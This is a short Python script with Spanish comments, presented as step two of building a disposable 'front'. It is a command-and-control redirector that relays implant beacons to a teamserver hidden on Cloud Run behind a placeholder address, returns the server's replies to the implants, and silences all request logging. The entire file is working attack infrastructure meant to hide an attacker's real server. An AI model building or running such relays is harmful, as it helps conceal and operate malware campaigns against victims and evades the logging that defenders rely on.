# redirector.py — Paso 2: el frente desechable
# Recibe beacons de los agentes y los reenvía al teamserver real.
import os, urllib.request
from http.server import HTTPServer, BaseHTTPRequestHandler

C2 = "https://TU-C2.run.app"  # el teamserver en Cloud Run, escondido detrás
PUERTO = int(os.environ.get("PORT", 8080))

class Frente(BaseHTTPRequestHandler):
    def do_POST(self):
        cuerpo = self.rfile.read(int(self.headers["Content-Length"]))
        req = urllib.request.Request(C2 + self.path, data=cuerpo,
                                     headers={"Content-Type": "application/json"})
        respuesta = urllib.request.urlopen(req, timeout=5).read()
        self.send_response(200)
        self.end_headers()
        self.wfile.write(respuesta)

    def log_message(self, *args):
        pass  

print(f"Frente en :{PUERTO} → reenviando a {C2}")
HTTPServer(("0.0.0.0", PUERTO), Frente).serve_forever()
